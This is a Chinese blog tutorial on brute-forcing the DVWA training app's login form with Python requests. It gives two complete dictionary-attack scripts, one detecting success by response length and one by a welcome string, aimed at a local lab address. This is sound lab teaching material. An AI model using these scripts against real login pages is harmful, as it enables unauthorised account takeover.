
--- 
title:  只用了20行Python代码就攻破了网站登录 
tags: []
categories: [] 

---
测试靶机为DVWA，适合DVWA暴力破解模块的Low和Medium等级。

### **关键代码解释**

**url指定url地址**

```
url = "http://192.168.171.2/dvwa/vulnerabilities/brute/"
```

**header设置请求头**

```
header = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
    'Cookie':'security=medium; PHPSESSID=geo7gb3ehf5gfnbhrvuqu545i7'
}
```

**payload设置请求参数**

```
payload = {'username':username,'password':password,"Login":'Login'}
```

这一行的作用是作一次get请求，响应信息被变量Response接收。

```
Response = requests.get(url,params=payload,headers=header)
```

**这两行代码循环遍历账号和密码字典文件，之后给他们做笛卡尔积循环暴力破解**

这种方式和burp的Intruder模块的Cluster bomb攻击方式一样。

```
for admin in open("C:\\Users\\admin\\Documents\\字典\\账号.txt"):
    for line in open("C:\\Users\\admin\\Documents\\字典\\密码.txt"):
```

**然后把循环结果存放到csv文件里，用逗号分割数据**

Response.status_code是响应的http状态码，len(Response.content)是http响应报文的长度。

```
result = str(Response.status_code) + ',' + username + ','\
  + password + ',' + str(len(Response.content))
f.write(result + '\n')
```

### 

### **完整代码**

#### 方法一

登陆成功的和失败返回数据不同，所以数据包长度也不同。包长度与其他不同的数据，可能就是正确的账号密码。

```
import requests


url = "http://192.168.171.2/dvwa/vulnerabilities/brute/"
#proxies= {"http":"http://127.0.0.1:8080"}  #代理设置，方便burp抓包查看
header = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
    'Cookie':'security=medium; PHPSESSID=bdi0ak5mqbud69nrnejgf8q00u'
}


f = open('result.csv','w')
f.write('状态码' + ',' + '用户名' + ',' + '密码' + ',' + '包长度' + '\n')
for admin in open("C:\\Users\\admin\\Documents\\字典\\账号.txt"):
    for line in open("C:\\Users\\admin\\Documents\\字典\\密码.txt"):
        username = admin.strip()
        password = line.strip()
        payload = {'username':username,'password':password,"Login":'Login'}
        Response = requests.get(url,params=payload,headers=header)
        result = str(Response.status_code) + ',' + username + ','\
            + password + ',' + str(len(Response.content))
        f.write(result + '\n')


print('\n完成')
```

##### 

##### 

##### 运行

<img src="https://img-blog.csdnimg.cn/img_convert/bf382d7811b9173415c607e50dc9d12b.png" alt="bf382d7811b9173415c607e50dc9d12b.png">

这就是脚本发送的数据包

<img src="https://img-blog.csdnimg.cn/img_convert/0cf9c584275956a51bc7718548581f8e.png" alt="0cf9c584275956a51bc7718548581f8e.png">

查看结果

<img src="https://img-blog.csdnimg.cn/img_convert/688717faf61ccc7fc96adaa7169637b1.png" alt="688717faf61ccc7fc96adaa7169637b1.png">

查看包长度与其他不同的数据，登录测试

<img src="https://img-blog.csdnimg.cn/img_convert/c89a2629b9e7e7f2012ce4100e8b1675.png" alt="c89a2629b9e7e7f2012ce4100e8b1675.png">

#### 方法二

这个方法是根据登陆成功的返回特征来判断是否为正确的账号密码，然后把正确的账号密码输出到屏幕和txt文件里。

主要改动在第17到20行

```
import requests


url = "http://192.168.171.2/dvwa/vulnerabilities/brute/"
#proxies= {"http":"http://127.0.0.1:8080"}  #代理设置，方便burp抓包查看
header = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
    'Cookie':'security=medium; PHPSESSID=bdi0ak5mqbud69nrnejgf8q00u'
}


f = open('result.txt','w')
for admin in open("C:\\Users\\admin\\Documents\\字典\\账号.txt"):
    for line in open("C:\\Users\\admin\\Documents\\字典\\密码.txt"):
        username = admin.strip()
        password = line.strip()
        payload = {'username':username,'password':password,"Login":'Login'}
        Response = requests.get(url,params=payload,headers=header)
        if not(Response.text.find('Welcome to the password protected area')==-1):
            result = username + ':' + password
            print(result)
            f.write(result + '\n')
            
print('\n完成')
```

##### 

##### 运行

<img src="https://img-blog.csdnimg.cn/img_convert/57ed08353992a126eadc309ad60e5173.png" alt="57ed08353992a126eadc309ad60e5173.png">

<img src="https://img-blog.csdnimg.cn/img_convert/9bbf089bcb70ea1019a7fda3335f11d4.png" alt="9bbf089bcb70ea1019a7fda3335f11d4.png">

**<strong>往期回顾：**</strong>
- - - - - - - - 